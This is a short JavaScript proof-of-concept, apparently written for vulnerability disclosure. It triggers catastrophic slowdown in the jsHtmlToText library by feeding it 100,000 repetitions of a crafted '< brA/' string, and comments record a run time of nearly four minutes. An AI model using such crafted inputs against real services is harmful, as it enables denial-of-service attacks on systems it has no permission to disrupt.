const htmlToText = require("./jsHtmlToText.js");

//Attack String :""+"< brA/"*100000+"!◎"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "< brA/";
}
str += "!◎";

var result = htmlToText(str, "");

// real    3m57.600s
// user    3m57.562s
// sys     0m0.020s